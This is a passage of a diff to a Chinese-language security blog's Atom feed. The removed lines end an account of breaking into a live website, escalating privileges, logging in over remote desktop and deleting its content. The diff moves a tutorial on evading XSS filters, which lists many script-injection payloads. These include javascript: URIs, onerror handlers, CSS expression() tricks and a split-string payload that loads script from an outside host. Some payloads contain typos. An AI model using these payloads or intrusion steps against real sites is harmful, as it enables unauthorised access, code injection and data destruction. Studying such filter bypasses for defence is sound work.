src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p><h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p><h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！&lt;br&gt;PS：操作很白痴，大牛勿喷——Bug’小虫&lt;/p&gt;
-&lt;h3 id=&quot;1-刚开始用的php一句话，发现执行不了命
-      
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="提权" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>linxu安装wps后无法启动的问题解决方法</title>
     <link href="http://yoursite.com/2017/10/17/linxu%E5%AE%89%E8%A3%85wps%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
     <id>http://yoursite.com/2017/10/17/linxu安装wps后无法启动的问题解决方法/</id>
@@ -435,31 +435,6 @@
   </entry>
   
   <entry>
-    <title>绕过XSS-Filter</title>
-    <link href="http://yoursite.com/2017/09/28/%E7%BB%95%E8%BF%87XSS-Filter%E5%8F%8A%E5%85%B6%E5%AE%83%E4%B8%80%E4%BA%9BXSS%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/"/>
-    <id>http://yoursite.com/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/</id>
-    <published>2017-09-28T08:42:19.000Z</published>
-    <updated>2018-07-10T15:27:03.844Z</updated>
-    
-    <content type="html"><![CDATA[<p>XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，编码和消毒过滤处理。<br>简单的来说，XSS-Filter实际上就是一段过滤函数。这段代码的功能封装在filter_xss()中，只要程序在处理输入时尽量使用该函数，就可以过滤常见的XSS。下面介绍一些常见的绕过方式。</p><h3 id="1，利用-lt-gt-标记注射Html-Javascript。"><a href="#1，利用-lt-gt-标记注射Html-Javascript。" class="headerlink" title="1，利用&lt;&gt;标记注射Html/Javascript。"></a>1，利用&lt;&gt;标记注射Html/Javascript。</h3><p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’);&lt;script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="2，利用标签属性执行XSS"><a href="#2，利用标签属性执行XSS" class="headerlink" title="2，利用标签属性执行XSS"></a>2，利用标签属性执行XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=”javascript:alert(/xss/)”&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=”javascript:alert(‘xss’)”&gt;</span><br><span class="line">href=</span><br><span class="line">lowsrc=</span><br><span class="line">bgsound=</span><br><span class="line">background=</span><br><span class="line">value=</span><br><span class="line">action=</span><br><span class="line">dynsrc=</span><br></pre></td></tr></table></figure><p>等都可以测试，但是前提是浏览器要支持伪协议</p><h3 id="3，空格，回车，Tab"><a href="#3，空格，回车，Tab" class="headerlink" title="3，空格，回车，Tab"></a>3，空格，回车，Tab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript:alert(/xss/)” width=100&gt;</span><br><span class="line">&lt;img src=”javas</span><br><span class="line">cript:</span><br><span class="line">alert(/xss/)” width=100&gt;</span><br></pre></td></tr></table></figure><h3 id="4-对标签属性值转码，因为HTML支持ASCII码的特性"><a href="#4-对标签属性值转码，因为HTML支持ASCII码的特性" class="headerlink" title="4,对标签属性值转码，因为HTML支持ASCII码的特性"></a>4,对标签属性值转码，因为HTML支持ASCII码的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript&amp;116&amp;#58alert(/xss/)”&gt;</span><br></pre></td></tr></table></figure><p>自己根据ASCII码可以自己修改，当然了，也可以综合上面的Tab键使用</p><h3 id="5，产生自己的事件"><a href="#5，产生自己的事件" class="headerlink" title="5，产生自己的事件"></a>5，产生自己的事件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”#” onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>注：onerror事件是IMG标记的一个事件，只要页面中发生错误，该事件立刻被激活。因为图片地址不正确，所有也被激活了<br>还有许多事件可以利用，下面只是一部分，感兴趣的可以自己再网上了解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onSeek</span><br><span class="line">onTimeError</span><br><span class="line">onURLFlip</span><br></pre></td></tr></table></figure></p><h3 id="6，利用CSS跨站剖析。"><a href="#6，利用CSS跨站剖析。" class="headerlink" title="6，利用CSS跨站剖析。"></a>6，利用CSS跨站剖析。</h3><p>XSS脚本的另一个载体是CSS样式表，使用CSS样式表执行JavaScript具有隐蔽，灵活多变等特点，但是CSS样式表有一个很大的缺点：各浏览器之间不能通用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;background-image: url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div style=&quot;width: expreeion(alert(&apos;xss&apos;));&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expreesion(alert(/xss/));&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>注：expreession执行JavaScript代码，expreession用来把css属性和jiavascript表达式关联起来。</p><h3 id="7，扰乱过滤规则"><a href="#7，扰乱过滤规则" class="headerlink" title="7，扰乱过滤规则"></a>7，扰乱过滤规则</h3><p>其实就是综合前面讲述的各种技巧<br>转换大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=&quot;javascript:alter(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>大小写混写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRC=&quot;jAvAscript:alert(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>不用双引号用单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;javascript:alerta(0);&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>不使用引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br></pre></td></tr></table></figure></p><p>用个反斜杠<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;mars.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&quot;alt=&quot;mars&quot;&gt;</span><br><span class="line">&lt;img/src=&quot;javascript:alter(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>8，利用字符编码<br>利用XSS编码工具可以对XSS进行编码，javascript支持Unicode，escapes，十六进制，八进制等编码形式<br>9，拆分跨站法<br>有的地方存在XSS漏洞，但是网站管理员对字符长度写入做了限制，那么就可以用该方法绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>上述代码的作用是引入一个字符串变量z，并且将下行代码拆分开来<br><code>bushdocument.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;&quot;)`</code></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，
-      
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="XSS" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XSS/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>JavaScript异常及事件处理</title>
     <link href="http://yoursite.com/2017/09/28/JavaScript%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86%E4%BA%8B%E4%BB%B6/"/>
     <id>http://yoursite.com/2017/09/28/JavaScript异常及处理事件/</id>
@@ -480,6 +455,31 @@
       <category term="编程开发" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
     
       <category term="javascript" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/javascript/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>绕过XSS-Filter</title>
+    <link href="http://yoursite.com/2017/09/28/%E7%BB%95%E8%BF%87XSS-Filter%E5%8F%8A%E5%85%B6%E5%AE%83%E4%B8%80%E4%BA%9BXSS%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95/"/>
+    <id>http://yoursite.com/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/</id>
+    <published>2017-09-28T08:42:19.000Z</published>
+    <updated>2018-07-10T15:27:03.844Z</updated>
+    
+    <content type="html"><![CDATA[<p>XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，编码和消毒过滤处理。<br>简单的来说，XSS-Filter实际上就是一段过滤函数。这段代码的功能封装在filter_xss()中，只要程序在处理输入时尽量使用该函数，就可以过滤常见的XSS。下面介绍一些常见的绕过方式。</p><h3 id="1，利用-lt-gt-标记注射Html-Javascript。"><a href="#1，利用-lt-gt-标记注射Html-Javascript。" class="headerlink" title="1，利用&lt;&gt;标记注射Html/Javascript。"></a>1，利用&lt;&gt;标记注射Html/Javascript。</h3><p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’);&lt;script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="2，利用标签属性执行XSS"><a href="#2，利用标签属性执行XSS" class="headerlink" title="2，利用标签属性执行XSS"></a>2，利用标签属性执行XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=”javascript:alert(/xss/)”&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=”javascript:alert(‘xss’)”&gt;</span><br><span class="line">href=</span><br><span class="line">lowsrc=</span><br><span class="line">bgsound=</span><br><span class="line">background=</span><br><span class="line">value=</span><br><span class="line">action=</span><br><span class="line">dynsrc=</span><br></pre></td></tr></table></figure><p>等都可以测试，但是前提是浏览器要支持伪协议</p><h3 id="3，空格，回车，Tab"><a href="#3，空格，回车，Tab" class="headerlink" title="3，空格，回车，Tab"></a>3，空格，回车，Tab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript:alert(/xss/)” width=100&gt;</span><br><span class="line">&lt;img src=”javas</span><br><span class="line">cript:</span><br><span class="line">alert(/xss/)” width=100&gt;</span><br></pre></td></tr></table></figure><h3 id="4-对标签属性值转码，因为HTML支持ASCII码的特性"><a href="#4-对标签属性值转码，因为HTML支持ASCII码的特性" class="headerlink" title="4,对标签属性值转码，因为HTML支持ASCII码的特性"></a>4,对标签属性值转码，因为HTML支持ASCII码的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript&amp;116&amp;#58alert(/xss/)”&gt;</span><br></pre></td></tr></table></figure><p>自己根据ASCII码可以自己修改，当然了，也可以综合上面的Tab键使用</p><h3 id="5，产生自己的事件"><a href="#5，产生自己的事件" class="headerlink" title="5，产生自己的事件"></a>5，产生自己的事件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”#” onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>注：onerror事件是IMG标记的一个事件，只要页面中发生错误，该事件立刻被激活。因为图片地址不正确，所有也被激活了<br>还有许多事件可以利用，下面只是一部分，感兴趣的可以自己再网上了解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onSeek</span><br><span class="line">onTimeError</span><br><span class="line">onURLFlip</span><br></pre></td></tr></table></figure></p><h3 id="6，利用CSS跨站剖析。"><a href="#6，利用CSS跨站剖析。" class="headerlink" title="6，利用CSS跨站剖析。"></a>6，利用CSS跨站剖析。</h3><p>XSS脚本的另一个载体是CSS样式表，使用CSS样式表执行JavaScript具有隐蔽，灵活多变等特点，但是CSS样式表有一个很大的缺点：各浏览器之间不能通用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;background-image: url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div style=&quot;width: expreeion(alert(&apos;xss&apos;));&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expreesion(alert(/xss/));&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>注：expreession执行JavaScript代码，expreession用来把css属性和jiavascript表达式关联起来。</p><h3 id="7，扰乱过滤规则"><a href="#7，扰乱过滤规则" class="headerlink" title="7，扰乱过滤规则"></a>7，扰乱过滤规则</h3><p>其实就是综合前面讲述的各种技巧<br>转换大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=&quot;javascript:alter(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>大小写混写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRC=&quot;jAvAscript:alert(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>不用双引号用单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;javascript:alerta(0);&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>不使用引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br></pre></td></tr></table></figure></p><p>用个反斜杠<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;mars.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&quot;alt=&quot;mars&quot;&gt;</span><br><span class="line">&lt;img/src=&quot;javascript:alter(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>8，利用字符编码<br>利用XSS编码工具可以对XSS进行编码，javascript支持Unicode，escapes，十六进制，八进制等编码形式<br>9，拆分跨站法<br>有的地方存在XSS漏洞，但是网站管理员对字符长度写入做了限制，那么就可以用该方法绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>上述代码的作用是引入一个字符串变量z，并且将下行代码拆分开来<br><code>bushdocument.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;&quot;)`</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="XSS" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XSS/"/>
     
     
   </entry>
